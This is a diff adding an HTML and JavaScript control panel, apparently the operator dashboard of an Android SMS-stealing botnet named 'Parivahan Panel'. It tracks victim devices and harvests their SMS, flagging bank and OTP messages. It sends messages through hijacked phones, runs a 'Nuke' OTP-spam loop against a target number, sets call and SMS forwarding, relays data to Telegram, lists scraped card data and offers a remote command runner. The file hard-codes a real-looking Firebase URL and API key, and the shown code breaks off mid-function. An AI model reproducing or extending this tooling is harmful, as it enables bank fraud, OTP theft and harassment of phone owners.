@@ -1,0 +1,2438 @@
+<!doctype html>
+<html lang="en" class="dark">
+  <head>
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width,initial-scale=1,maximum-scale=5"
+    />
+    <title>Parivahan Panel — Pure</title>
+    <meta name="robots" content="noindex,nofollow" />
+    <style>
+      :root {
+        --bg: #070a12;
+        --card: #0c101b;
+        --border: #1b2133;
+        --mut: #95a0b8;
+        --pri: #6d63ff;
+        --acc: #16c7f2;
+        --ok: #22c55e;
+        --warn: #f59e0b;
+        --bad: #ef4444;
+        --r: 14px;
+      }
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        margin: 0;
+        min-height: 100dvh;
+        background: var(--bg);
+        color: #e9edf5;
+        font:
+          14px/1.4 system-ui,
+          Outfit,
+          sans-serif;
+      }
+      a {
+        color: var(--pri);
+      }
+      input,
+      select,
+      textarea,
+      button {
+        font: inherit;
+      }
+      .wrap {
+        max-width: 1280px;
+        margin: 0 auto;
+        padding: 16px;
+      }
+      .card {
+        background: var(--card);
+        border: 1px solid var(--border);
+        border-radius: var(--r);
+        padding: 14px;
+      }
+      .mono {
+        font-family:
+          ui-monospace,
+          JetsBrains Mono,
+          monospace;
+      }
+      .eyebrow {
+        font: 600 11px/1 ui-monospace;
+        letter-spacing: 0.18em;
+        text-transform: uppercase;
+        color: var(--mut);
+      }
+      .title {
+        font:
+          700 22px/1.1 Syne,
+          Outfit,
+          sans-serif;
+        letter-spacing: -0.02em;
+      }
+      .grid2 {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 12px;
+      }
+      .grid3 {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 12px;
+      }
+      .grid4 {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        gap: 12px;
+      }
+      @media (max-width: 900px) {
+        .grid4 {
+          grid-template-columns: 1fr 1fr;
+        }
+        .grid3 {
+          grid-template-columns: 1fr;
+        }
+      }
+      @media (max-width: 640px) {
+        .grid2 {
+          grid-template-columns: 1fr;
+        }
+      }
+      .btn {
+        appearance: none;
+        border: 1px solid var(--border);
+        background: var(--card);
+        color: #e9edf5;
+        border-radius: 999px;
+        padding: 10px 14px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .btn:disabled {
+        opacity: 0.5;
+        cursor: not-allowed;
+      }
+      .btn.pri {
+        background: var(--pri);
+        border-color: var(--pri);
+        color: #fff;
+      }
+      .btn.bad {
+        background: var(--bad);
+        border-color: var(--bad);
+        color: #fff;
+      }
+      .btn.warn {
+        background: var(--warn);
+        border-color: var(--warn);
+        color: #070a12;
+      }
+      .input {
+        width: 100%;
+        background: var(--card);
+        border: 1px solid #2a3347;
+        border-radius: 12px;
+        padding: 10px 12px;
+        color: #e9edf5;
+      }
+      .input:focus {
+        outline: 2px solid #7d74ff;
+        outline-offset: 2px;
+      }
+      .badge {
+        display: inline-flex;
+        align-items: center;
+        gap: 6px;
+        padding: 4px 8px;
+        border-radius: 999px;
+        font: 600 11px/1 ui-monospace;
+        border: 1px solid var(--border);
+        background: rgba(255, 255, 255, 0.04);
+      }
+      .dot {
+        width: 8px;
+        height: 8px;
+        border-radius: 50%;
+        background: var(--mut);
+      }
+      .dot.ok {
+        background: var(--ok);
+        box-shadow: 0 0 0 4px rgba(34, 197, 94, 0.18);
+      }
+      .dot.bad {
+        background: var(--bad);
+      }
+      .dev {
+        display: flex;
+        gap: 10px;
+        align-items: center;
+        padding: 10px;
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        background: rgba(255, 255, 255, 0.02);
+        cursor: pointer;
+      }
+      .dev.sel {
+        border-color: var(--pri);
+        box-shadow: 0 0 0 1px rgba(109, 99, 255, 0.35);
+      }
+      .sms {
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        padding: 12px;
+        background: var(--card);
+        margin-bottom: 8px;
+      }
+      .sms.bank {
+        border-color: rgba(245, 158, 11, 0.35);
+      }
+      .sms.otp {
+        border-color: rgba(109, 99, 255, 0.35);
+      }
+      .toast {
+        position: fixed;
+        right: 12px;
+        bottom: 12px;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        z-index: 99;
+      }
+      .toast > div {
+        background: #111827;
+        border: 1px solid #2a3347;
+        border-radius: 12px;
+        padding: 10px 12px;
+        min-width: 260px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      }
+      .pill {
+        font: 600 11px/1 ui-monospace;
+        padding: 3px 7px;
+        border-radius: 999px;
+        border: 1px solid var(--border);
+      }
+      .kbd {
+        font: 600 11px ui-monospace;
+        background: #1a2133;
+        border: 1px solid #2a3347;
+        border-bottom-width: 2px;
+        border-radius: 6px;
+        padding: 2px 6px;
+      }
+      hr {
+        border: none;
+        border-top: 1px solid var(--border);
+        margin: 12px 0;
+      }
+      .small {
+        font-size: 12px;
+        color: var(--mut);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <div
+        class="card"
+        style="display: flex; gap: 12px; flex-wrap: wrap; align-items: end"
+      >
+        <div style="flex: 1 1 280px">
+          <div class="eyebrow">Firebase REST</div>
+          <input
+            id="fbUrl"
+            class="input mono"
+            placeholder="https://YOUR-project-default-rtdb.firebaseio.com"
+            value="https://axexodiweb-default-rtdb.firebaseio.com"
+          />
+          <div class="small" style="margin-top: 6px">
+            Database URL (no trailing slash). Uses
+            <span class="kbd">/clients.json?auth=API_KEY</span> · API key from
+            Firebase console
+          </div>
+        </div>
+        <div style="flex: 1 1 260px">
+          <div class="eyebrow">API Key (?auth=API_KEY)</div>
+          <input
+            id="fbSecret"
+            class="input mono"
+            placeholder="paste Firebase API key (AIza…)"
+            type="text"
+            value="AIzaSyBPnv-sbBjTql8w0PcEOCGkBx41c5TC8bk"
+          />
+          <div class="small" style="margin-top: 6px">
+            <label
+              ><input id="remember" type="checkbox" checked /> remember in
+              localStorage</label
+            >
+            ·
+            <span id="conn" class="badge"
+              ><span class="dot" id="connDot"></span
+              ><span id="connTxt">idle</span></span
+            >
+          </div>
+        </div>
+        <div style="display: flex; gap: 8px">
+          <button class="btn pri" id="saveCfg">Save &amp; Connect</button>
+          <button class="btn" id="clearCfg">Clear</button>
+        </div>
+      </div>
+
+      <div style="height: 12px"></div>
+      <div
+        class="card"
+        style="display: flex; gap: 8px; flex-wrap: wrap; align-items: center"
+      >
+        <span class="eyebrow" style="margin-right: 6px">Views:</span>
+        <button
+          class="btn pri"
+          onclick="showTab('tab-devices')"
+          id="tabBtn-devices"
+        >
+          Devices
+        </button>
+        <button class="btn" onclick="showTab('tab-smsall')" id="tabBtn-smsall">
+          SMS All
+        </button>
+        <button class="btn" onclick="showTab('tab-otps')" id="tabBtn-otps">
+          OTPs
+        </button>
+        <button
+          class="btn"
+          onclick="showTab('tab-firebases')"
+          id="tabBtn-firebases"
+        >
+          Firebases
+        </button>
+        <button class="btn" onclick="showTab('tab-users')" id="tabBtn-users">
+          Users
+        </button>
+        <button
+          class="btn"
+          onclick="showTab('tab-telegram')"
+          id="tabBtn-telegram"
+        >
+          Telegram
+        </button>
+        <button class="btn" onclick="showTab('tab-data')" id="tabBtn-data">
+          Data/Cards
+        </button>
+        <button class="btn" onclick="showTab('tab-pam')" id="tabBtn-pam">
+          PAM
+        </button>
+        <span class="small" style="margin-left: auto"
+          >Pure HTML · REST · <span class="kbd">setInterval</span></span
+        >
+      </div>
+
+      <div style="height: 12px"></div>
+      <div id="tab-devices" class="tabview">
+        <div class="card">
+          <div
+            style="
+              display: flex;
+              justify-content: space-between;
+              align-items: center;
+              gap: 12px;
+              flex-wrap: wrap;
+            "
+          >
+            <div>
+              <div class="eyebrow">Fleet</div>
+              <div class="title">
+                Devices <span id="devCount" class="small"></span>
+              </div>
+            </div>
+            <div style="display: flex; gap: 8px; align-items: center">
+              <span class="badge"
+                ><span class="dot ok"></span
+                ><span id="onlineN">0</span> online</span
+              >
+              <span class="badge"
+                ><span class="dot bad"></span
+                ><span id="offlineN">0</span> offline</span
+              >
+              <span class="badge"
+                >auto <span class="kbd">3s</span> polling</span
+              >
+              <button class="btn" id="refreshNow">Refresh now</button>
+            </div>
+          </div>
+          <div
+            style="margin-top: 10px; display: flex; gap: 8px; flex-wrap: wrap"
+          >
+            <input
+              id="q"
+              class="input"
+              placeholder="Search phone, model, UPI, id, group"
+              style="flex: 1 1 220px"
+            />
+            <select id="flt" class="input" style="width: 160px">
+              <option value="all">All</option>
+              <option value="online">Online</option>
+              <option value="offline">Offline</option>
+              <option value="upi">UPI</option>
+              <option value="bank">Bank SMS</option>
+            </select>
+            <select id="grp" class="input" style="width: 160px">
+              <option value="all">All groups</option>
+            </select>
+            <button class="btn" id="exportCsv">Export SMS CSV</button>
+          </div>
+          <div id="fleet" class="grid4" style="margin-top: 12px"></div>
+          <div
+            id="fleetEmpty"
+            class="small"
+            style="display: none; padding: 12px; text-align: center"
+          >
+            No devices match.
+          </div>
+        </div>
+
+        <div style="height: 12px"></div>
+        <div class="grid2">
+          <div class="card">
+            <div class="eyebrow">Send SMS (writes to Firebase)</div>
+            <div class="title" style="font-size: 18px; margin-top: 4px">
+              Send via device(s)
+            </div>
+            <div class="small">
+              Writes
+              <span class="kbd"
+                >clients/{id}/webhookEvent/sendSms
+                {to,message,isSended:true,from}</span
+              >
+            </div>
+            <hr />
+            <div style="display: grid; gap: 8px">
+              <input
+                id="sendTo"
+                class="input mono"
+                placeholder="Destination +91…"
+              />
+              <textarea
+                id="sendMsg"
+                class="input"
+                rows="3"
+                placeholder="Message… supports {otp} will be replaced if Nuke"
+              ></textarea>
+              <div style="display: flex; gap: 8px">
+                <select id="sendSim" class="input" style="width: 120px">
+                  <option value="0">SIM1 (0)</option>
+                  <option value="1">SIM2 (1)</option>
+                </select>
+                <button class="btn pri" id="sendOne" style="flex: 1">
+                  Send via selected
+                </button>
+                <button class="btn" id="sendBulk" title="send via all online">
+                  Bulk online
+                </button>
+              </div>
+              <div class="small">
+                Selected: <span id="selInfo" class="mono">none</span> ·
+                <span id="sendStatus"></span>
+              </div>
+            </div>
+            <hr />
+            <div class="eyebrow" style="color: var(--warn)">
+              Nuke — mass random OTP loop
+            </div>
+            <div style="display: grid; gap: 8px; margin-top: 8px">
+              <input
+                id="nukeTarget"
+                class="input mono"
+                placeholder="Target number for Nuke (overrides Send To)"
+              />
+              <input
+                id="nukeTpl"
+                class="input"
+                value="Your OTP is {otp}. Do not share. Valid for 5 min."
+              />
+              <div style="display: flex; gap: 8px">
+                <select id="nukeLen" class="input" style="width: 110px">
+                  <option value="4">OTP 4</option>
+                  <option value="6" selected>OTP 6</option>
+                  <option value="8">OTP 8</option>
+                </select>
+                <input
+                  id="nukeInt"
+                  class="input mono"
+                  type="number"
+                  value="900"
+                  min="400"
+                  max="5000"
+                  step="100"
+                  style="width: 110px"
+                  title="interval ms"
+                />
+                <select id="nukeSim" class="input" style="width: 110px">
+                  <option value="0">SIM1</option>
+                  <option value="1">SIM2</option>
+                </select>
+              </div>
+              <div style="display: flex; gap: 8px">
+                <button class="btn warn" id="nukeStart" style="flex: 1">
+                  ▶ Start Nuke
+                </button>
+                <button class="btn bad" id="nukeStop" style="flex: 1" disabled>
+                  ■ Stop
+                </button>
+              </div>
+              <div class="small">
+                Loops <span id="nukeLoops" class="mono">0</span> · Sent
+                <span id="nukeSent" class="mono">0</span> · Failed
+                <span id="nukeFail" class="mono">0</span> ·
+                <span id="nukeState" class="badge">idle</span>
+              </div>
+              <div class="small" style="color: var(--warn)">
+                Uses <span class="kbd">setInterval</span> ~900ms ±200ms jitter →
+                all <b>online</b> devices. Stop is instant.
+              </div>
+            </div>
+          </div>
+
+          <div class="card">
+            <div
+              style="
+                display: flex;
+                justify-content: space-between;
+                align-items: center;
+              "
+            >
+              <div>
+                <div class="eyebrow">Messages</div>
+                <div class="title" style="font-size: 18px">SMS per device</div>
+              </div>
+              <span id="smsCount" class="badge">0</span>
+            </div>
+            <div style="display: flex; gap: 8px; margin-top: 8px">
+              <input
+                id="smsQ"
+                class="input"
+                placeholder="Search SMS body/sender"
+                style="flex: 1"
+              />
+              <label class="badge" style="cursor: pointer"
+                ><input id="bankOnly" type="checkbox" /> bank only</label
+              >
+            </div>
+            <div
+              id="smsList"
+              style="
+                margin-top: 10px;
+                max-height: 520px;
+                overflow: auto;
+                border: 1px solid var(--border);
+                border-radius: 12px;
+                padding: 8px;
+                background: rgba(255, 255, 255, 0.02);
+              "
+            ></div>
+            <div class="small" style="margin-top: 8px">
+              <span class="pill">IN</span> incoming ·
+              <span class="pill" style="border-color: var(--pri)">OUT</span>
+              outgoing · bank=amber · otp=purple
+            </div>
+          </div>
+        </div>
+
+        <div style="height: 12px"></div>
+        <div class="card">
+          <div class="eyebrow">Device management</div>
+          <div
+            style="
+              display: grid;
+              grid-template-columns: 1fr 1fr;
+              gap: 8px;
+              margin-top: 8px;
+            "
+          >
+            <input
+              id="editName"
+              class="input"
+              placeholder="deviceName (label)"
+            />
+            <input
+              id="editGroup"
+              class="input"
+              placeholder="group (e.g. Delhi)"
+            />
+            <input
+              id="editNotes"
+              class="input"
+              placeholder="notes / memo"
+              style="grid-column: 1/-1"
+            />
+            <input
+              id="editColor"
+              class="input mono"
+              placeholder="colorTag #rrggbb"
+            />
+            <input
+              id="editOwner"
+              class="input mono"
+              placeholder="ownerTelegramId"
+            />
+          </div>
+          <div
+            style="display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap"
+          >
+            <button class="btn pri" id="saveEdit">
+              Save label &amp; notes
+            </button>
+            <button class="btn bad" id="delDev">Delete device</button>
+            <button class="btn" id="addDev">Add dummy device</button>
+            <button class="btn" id="pingBtn">Ping (checkLiveness)</button>
+            <span id="pingRes" class="badge" style="display: none"></span>
+          </div>
+          <div class="small" style="margin-top: 8px">
+            Add/Edit/Delete via REST:
+            <span class="kbd">PUT /clients/{id}.json?auth=API_KEY</span> ·
+            <span class="kbd">DELETE /clients/{id}.json?auth=API_KEY</span> ·
+            <span class="kbd">PATCH /clients/{id}.json?auth=API_KEY</span>
+          </div>
+        </div>
+      </div>
+      <!-- end tab-devices -->
+      <div id="tab-smsall" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">SMS All (messages.json)</div>
+          <div class="title" style="font-size: 18px">
+            All Messages (across devices)
+          </div>
+          <div style="display: flex; gap: 8px; margin-top: 8px">
+            <input
+              id="smsAllQ"
+              class="input"
+              placeholder="Search all SMS"
+              style="flex: 1"
+            /><label class="badge" style="cursor: pointer"
+              ><input id="smsAllBank" type="checkbox" /> bank only</label
+            ><button class="btn" id="smsAllRefresh">Refresh</button
+            ><button class="btn" id="smsAllExport">Export CSV</button>
+          </div>
+          <div
+            id="smsAllList"
+            style="
+              margin-top: 10px;
+              max-height: 560px;
+              overflow: auto;
+              border: 1px solid var(--border);
+              border-radius: 12px;
+              padding: 8px;
+              background: rgba(255, 255, 255, 0.02);
+            "
+          ></div>
+          <div class="small">
+            Fetched via
+            <span class="kbd">GET messages.json?auth=API_KEY</span> — flattened,
+            latest 500
+          </div>
+        </div>
+      </div>
+      <div id="tab-otps" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">otps/latest</div>
+          <div class="title" style="font-size: 18px">Latest OTPs</div>
+          <div style="display: flex; gap: 8px; margin-top: 8px">
+            <button class="btn" id="otpsRefresh">Refresh</button
+            ><button class="btn" id="otpsClear">Clear all (DELETE)</button>
+          </div>
+          <div
+            id="otpsList"
+            style="margin-top: 10px; max-height: 520px; overflow: auto"
+          ></div>
+          <div class="small">
+            Path <span class="kbd">otps/latest.json?auth=API_KEY</span> · also
+            <span class="kbd">otps/{tgId}.json?auth=API_KEY</span>
+          </div>
+        </div>
+      </div>
+      <div id="tab-firebases" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">config/firebases</div>
+          <div class="title" style="font-size: 18px">Firebases (multi-DB)</div>
+          <div
+            style="display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap"
+          >
+            <input
+              id="fbAddUrl"
+              class="input mono"
+              placeholder="https://PROJECT-default-rtdb.firebaseio.com"
+              style="flex: 1"
+            /><input
+              id="fbAddKey"
+              class="input mono"
+              placeholder="apiKey (optional)"
+              style="flex: 1"
+            /><button class="btn pri" id="fbAdd">Add</button
+            ><button class="btn" id="fbRefresh">Refresh</button>
+          </div>
+          <div id="fbList" style="margin-top: 10px"></div>
+          <div class="small">
+            Stored at
+            <span class="kbd">config/firebases.json?auth=API_KEY</span> —
+            visible to all admins
+          </div>
+        </div>
+      </div>
+      <div id="tab-users" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">subscriptions</div>
+          <div class="title" style="font-size: 18px">Users / Subscriptions</div>
+          <div
+            style="display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap"
+          >
+            <input
+              id="uId"
+              class="input mono"
+              placeholder="telegramId (numeric)"
+              style="flex: 1"
+            /><input
+              id="uName"
+              class="input"
+              placeholder="username"
+              style="flex: 1"
+            /><input
+              id="uDays"
+              class="input mono"
+              placeholder="days"
+              value="30"
+              style="width: 90px"
+            /><button class="btn pri" id="uAdd">Add/Update</button
+            ><button class="btn" id="uRefresh">Refresh</button>
+          </div>
+          <div id="uList" style="margin-top: 10px"></div>
+          <div class="small">
+            Paths
+            <span class="kbd">subscriptions/{id}.json?auth=API_KEY</span> ·
+            <span class="kbd">config/admin.json?auth=API_KEY</span>
+          </div>
+        </div>
+      </div>
+      <div id="tab-telegram" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">Telegram — Personal</div>
+          <div class="title" style="font-size: 18px">
+            My Channels &amp; Rules
+          </div>
+          <div
+            style="display: flex; gap: 8px; margin-top: 8px; flex-wrap: wrap"
+          >
+            <input
+              id="tgUserId"
+              class="input mono"
+              placeholder="Your Telegram ID (numeric) — for personal channels"
+              style="flex: 1"
+            /><button class="btn" id="tgLoad">Load my channels</button>
+          </div>
+          <div style="margin-top: 10px; display: grid; gap: 8px">
+            <div>
+              <div class="small" style="font-weight: 700">
+                My SMS Channel (config/userChannels/{id}/sms)
+              </div>
+              <div style="display: flex; gap: 8px; margin-top: 4px">
+                <input
+                  id="personalChannel"
+                  class="input mono"
+                  placeholder="-100… channel ID"
+                /><button class="btn pri" id="savePersonal">Save</button
+                ><button class="btn" id="clearPersonal">Clear</button>
+              </div>
+              <div id="personalInfo" class="small"></div>
+            </div>
+            <div>
+              <div class="small" style="font-weight: 700">
+                Finance Alert Channel (config/userChannels/{id}/finance)
+              </div>
+              <div style="display: flex; gap: 8px; margin-top: 4px">
+                <input
+                  id="financeChannel"
+                  class="input mono"
+                  placeholder="-100… finance channel"
+                /><button class="btn pri" id="saveFinance">Save</button
+                ><button class="btn" id="clearFinance">Clear</button>
+              </div>
+              <div id="financeInfo" class="small"></div>
+            </div>
+            <div>
+              <div class="small" style="font-weight: 700">
+                Keyword Rules (config/userChannels/{id}/rules/{keyword})
+              </div>
+              <div
+                style="
+                  display: flex;
+                  gap: 8px;
+                  margin-top: 4px;
+                  flex-wrap: wrap;
+                "
+              >
+                <input
+                  id="ruleKeyword"
+                  class="input"
+                  placeholder="keyword e.g. HDFC"
+                  style="flex: 1"
+                /><input
+                  id="ruleChannel"
+                  class="input mono"
+                  placeholder="-100… channel"
+                  style="flex: 1"
+                /><button class="btn pri" id="addRule">Add</button>
+              </div>
+              <div id="rulesList" style="margin-top: 8px"></div>
+            </div>
+          </div>
+        </div>
+        <div style="height: 12px"></div>
+        <div class="card">
+          <div class="eyebrow">Telegram — Global (admin)</div>
+          <div class="title" style="font-size: 18px">
+            Global SMS Channel &amp; Forward Defaults
+          </div>
+          <div style="margin-top: 8px">
+            <div class="small" style="font-weight: 700">
+              Global SMS Channel (config/smsChannel)
+            </div>
+            <div style="display: flex; gap: 8px; margin-top: 4px">
+              <input
+                id="globalChannel"
+                class="input mono"
+                placeholder="-100… global channel"
+              /><button class="btn pri" id="saveGlobal">Save</button
+              ><button class="btn" id="clearGlobal">Clear</button>
+            </div>
+            <div id="globalInfo" class="small"></div>
+          </div>
+          <div style="margin-top: 10px">
+            <div class="small" style="font-weight: 700">
+              Forward Defaults (config/forwardDefaults) — auto for NEW devices
+            </div>
+            <div
+              style="
+                display: grid;
+                grid-template-columns: 1fr 1fr;
+                gap: 8px;
+                margin-top: 4px;
+              "
+            >
+              <input
+                id="fwdCall"
+                class="input mono"
+                placeholder="call forward number"
+              /><input
+                id="fwdSms"
+                class="input mono"
+                placeholder="sms forward number"
+              />
+            </div>
+            <div style="display: flex; gap: 8px; margin-top: 8px">
+              <button class="btn pri" id="fwdSave">Save forwardDefaults</button
+              ><button class="btn" id="fwdRefresh">Refresh</button>
+            </div>
+            <div id="fwdInfo" class="small" style="margin-top: 8px"></div>
+          </div>
+        </div>
+        <div style="height: 12px"></div>
+        <div class="card">
+          <div class="eyebrow">PAM / Tool (via /api)</div>
+          <div style="display: flex; gap: 8px; margin-top: 8px">
+            <input
+              id="pamCmd"
+              class="input mono"
+              placeholder="pam command or tool path"
+              style="flex: 1"
+            /><button class="btn" id="pamRun">Run via /api/pam/exec</button
+            ><button class="btn" id="pamStatus">Status</button>
+          </div>
+          <pre
+            id="pamOut"
+            class="mono small"
+            style="
+              margin-top: 8px;
+              max-height: 240px;
+              overflow: auto;
+              background: #0b1220;
+              padding: 10px;
+              border-radius: 10px;
+              border: 1px solid var(--border);
+            "
+          ></pre>
+        </div>
+      </div>
+      <div id="tab-data" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">Scraped / Cards</div>
+          <div class="title" style="font-size: 18px">
+            Cards &amp; Scraped Data
+          </div>
+          <div style="display: flex; gap: 8px; margin-top: 8px">
+            <input
+              id="dataQ"
+              class="input"
+              placeholder="Search cards, hasCards, upi, model"
+              style="flex: 1"
+            /><button class="btn" id="dataRefresh">Refresh</button>
+          </div>
+          <div id="dataList" style="margin-top: 10px"></div>
+          <div class="small">
+            Filtered via
+            <span class="kbd">clients.json?auth=API_KEY</span> where
+            <span class="kbd">cc_* || cards</span>
+          </div>
+        </div>
+      </div>
+      <div id="tab-pam" class="tabview" style="display: none">
+        <div class="card">
+          <div class="eyebrow">PAM</div>
+          <div class="title" style="font-size: 18px">PAM Exec</div>
+          <div class="small">
+            Uses <span class="kbd">/api/pam/*</span> on same origin — will use
+            <span class="kbd">cyberzone_auth</span> Bearer if logged in, else
+            may 401.
+          </div>
+          <div style="display: flex; gap: 8px; margin-top: 8px">
+            <button class="btn pri" id="pamRefresh2">Refresh PAM</button>
+          </div>
+          <div id="pamList2" class="small" style="margin-top: 8px"></div>
+        </div>
+      </div>
+      <div
+        class="small"
+        style="text-align: center; margin-top: 12px; opacity: 0.7"
+      >
+        Pure HTML/CSS/JS · no build · fetch REST + secret · setInterval polling
+        · ponytail: minimal, no deps —
+        <span class="mono">localStorage parivahan_pure_cfg + cache</span>
+      </div>
+    </div>
+
+    <div id="toasts" class="toast" aria-live="polite" aria-atomic="false"></div>
+
+    <script>
+      // ponytail: vanilla, no framework — single file, stdlib only
+      const $ = (s) => document.querySelector(s);
+      const els = {
+        fbUrl: $("#fbUrl"),
+        fbSecret: $("#fbSecret"),
+        remember: $("#remember"),
+        saveCfg: $("#saveCfg"),
+        clearCfg: $("#clearCfg"),
+        connDot: $("#connDot"),
+        connTxt: $("#connTxt"),
+        devCount: $("#devCount"),
+        onlineN: $("#onlineN"),
+        offlineN: $("#offlineN"),
+        fleet: $("#fleet"),
+        fleetEmpty: $("#fleetEmpty"),
+        q: $("#q"),
+        flt: $("#flt"),
+        grp: $("#grp"),
+        refreshNow: $("#refreshNow"),
+        exportCsv: $("#exportCsv"),
+        sendTo: $("#sendTo"),
+        sendMsg: $("#sendMsg"),
+        sendSim: $("#sendSim"),
+        sendOne: $("#sendOne"),
+        sendBulk: $("#sendBulk"),
+        selInfo: $("#selInfo"),
+        sendStatus: $("#sendStatus"),
+        nukeTarget: $("#nukeTarget"),
+        nukeTpl: $("#nukeTpl"),
+        nukeLen: $("#nukeLen"),
+        nukeInt: $("#nukeInt"),
+        nukeSim: $("#nukeSim"),
+        nukeStart: $("#nukeStart"),
+        nukeStop: $("#nukeStop"),
+        nukeLoops: $("#nukeLoops"),
+        nukeSent: $("#nukeSent"),
+        nukeFail: $("#nukeFail"),
+        nukeState: $("#nukeState"),
+        smsQ: $("#smsQ"),
+        bankOnly: $("#bankOnly"),
+        smsList: $("#smsList"),
+        smsCount: $("#smsCount"),
+        editName: $("#editName"),
+        editGroup: $("#editGroup"),
+        editNotes: $("#editNotes"),
+        editColor: $("#editColor"),
+        editOwner: $("#editOwner"),
+        saveEdit: $("#saveEdit"),
+        delDev: $("#delDev"),
+        addDev: $("#addDev"),
+        pingBtn: $("#pingBtn"),
+        pingRes: $("#pingRes"),
+        toasts: $("#toasts"),
+      };
+      let CFG = { url: "", secret: "" };
+      let devices = []; // {id, raw, model, phone, isOnline, ...}
+      let selectedId = null;
+      let smsData = {}; // {key: sms}
+      let nukeTimer = null,
+        nukeAbort = false,
+        nukeStats = { loops: 0, sent: 0, failed: 0 };
+      let prevOnline = JSON.parse(
+        localStorage.getItem("parivahan_pure_last") || "{}"
+      );
+      let pollTimer = null;
+
+      // ---- config ----
+      function loadCfg() {
+        try {
+          const u = localStorage.getItem("parivahan_pure_url");
+          const s = localStorage.getItem("parivahan_pure_secret");
+          if (u) els.fbUrl.value = u;
+          if (s) els.fbSecret.value = s;
+          // also support ?fb= & ?secret=
+          const p = new URLSearchParams(location.search);
+          if (p.get("fb")) els.fbUrl.value = p.get("fb");
+          if (p.get("secret")) els.fbSecret.value = p.get("secret");
+          saveCfg(false);
+        } catch {}
+      }
+      function saveCfg(showToast = true) {
+        let url = els.fbUrl.value.trim().replace(/\/+$/, "");
+        let sec = els.fbSecret.value.trim();
+        if (!url) {
+          setConn("idle", "enter URL");
+          return;
+        }
+        // normalize: allow with or without https
+        if (!/^https?:\/\//.test(url)) url = "https://" + url;
+        CFG.url = url;
+        CFG.secret = sec;
+        if (els.remember.checked) {
+          try {
+            localStorage.setItem("parivahan_pure_url", url);
+            if (sec) localStorage.setItem("parivahan_pure_secret", sec);
+          } catch {}
+        }
+        setConn("connecting", "…");
+        if (showToast) toast("Config saved", "Connecting…");
+        // kick fetch
+        fetchDevices();
+        fetchSmsIfNeeded();
+      }
+      function clearCfg() {
+        try {
+          localStorage.removeItem("parivahan_pure_url");
+          localStorage.removeItem("parivahan_pure_secret");
+        } catch {}
+        els.fbSecret.value = "";
+        toast("Cleared", "Enter URL + API key again");
+        setConn("idle", "cleared");
+      }
+      function setConn(state, txt) {
+        els.connTxt.textContent = txt || state;
+        els.connDot.className =
+          "dot " + (state === "ok" ? "ok" : state === "bad" ? "bad" : "");
+      }
+      function buildUrl(path) {
+        // path without .json
+        if (!CFG.url) return null;
+        const auth = CFG.secret
+          ? `?auth=${encodeURIComponent(CFG.secret)}`
+          : ""; // ponytail: auth is Firebase API key per request (AIza…), used as REST ?auth=API_KEY
+        return `${CFG.url}/${path}.json${auth}`;
+      }
+      function toast(title, desc) {
+        const d = document.createElement("div");
+        d.innerHTML = `<div style="font-weight:700">${esc(title)}</div><div class="small">${esc(desc || "")}</div>`;
+        els.toasts.appendChild(d);
+        setTimeout(() => d.remove(), 3200);
+      }
+      function esc(s) {
+        return String(s || "").replace(
+          /[&<>"]/g,
+          (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]
+        );
+      }
+
+      // ---- helpers: normalize & isOnline ----
+      function isOnlineRaw(raw) {
+        const t = raw.ping ?? raw.lastPing;
+        if (t != null) {
+          const n = Number(t);
+          if (!Number.isNaN(n)) return Date.now() - n < 300_000;
+        }
+        if (typeof raw.status === "boolean") return raw.status;
+        if (typeof raw.status === "string")
+          return raw.status === "true" || raw.status === "online";
+        return false;
+      }
+      function norm(id, raw) {
+        const model = raw.modelName || raw.model || "Unknown";
+        const phone = raw.mobNo || raw.phone || "";
+        let sim1 = raw.sim1 || "",
+          sim2 = raw.sim2 || "";
+        if (Array.isArray(raw.sims)) {
+          if (raw.sims[0]) {
+            const s = raw.sims[0];
+            sim1 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
+          }
+          if (raw.sims[1]) {
+            const s = raw.sims[1];
+            sim2 = [s.phoneNumber, s.carrierName].filter(Boolean).join(" · ");
+          }
+        }
+        return {
+          id,
+          raw,
+          model,
+          phone,
+          upi: raw.upi || "",
+          battery: raw.battery || "",
+          sim1,
+          sim2,
+          isOnline: isOnlineRaw(raw),
+          ownerTelegramId: raw.ownerTelegramId || "",
+          group: raw.group || "",
+          deviceName: raw.deviceName || "",
+          colorTag: raw.colorTag || "",
+          notes: raw.notes || raw.memo || "",
+          ip: raw.ip_address || "",
+        };
+      }
+      function classify(text) {
+        const s = (text || "").toLowerCase();
+        const has = (k) => s.includes(k);
+        const bankKws = [
+          "sbi",
+          "hdfc",
+          "icici",
+          "axis",
+          "kotak",
+          "pnb",
+          "bob",
+          "canara",
+          "union bank",
+          "yes bank",
+          "indusind",
+          "idfc",
+          "paytm",
+          "phonepe",
+          "credited",
+          "debited",
+          "a/c",
+          "emi",
+          "neft",
+          "imps",
+          "atm",
+          "balance",
+        ];
+        const otpKws = ["otp", "one time password", "verification code"];
+        const isBank = bankKws.some(has);
+        const isOtp = otpKws.some(has);
+        return {
+          isBank,
+          isOtp,
+          otp: (text.match(/\b\d{4,8}\b/) || [])[0] || "",
+        };
+      }
+
+      // ---- fetch devices via REST polling (setInterval) ----
+      async function fetchDevices() {
+        const url = buildUrl("clients");
+        if (!url) return;
+        try {
+          const r = await fetch(url, { cache: "no-store" });
+          if (!r.ok) throw new Error("HTTP " + r.status);
